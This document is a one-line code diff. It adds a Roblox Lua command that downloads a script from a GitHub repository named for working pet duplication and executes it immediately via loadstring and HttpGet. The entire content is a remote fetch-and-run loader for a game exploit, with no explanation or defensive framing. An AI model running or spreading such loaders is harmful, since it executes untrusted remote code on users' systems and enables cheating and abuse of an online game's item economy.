@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jason75ke57/pet-duping-working-/main/wow",true))();
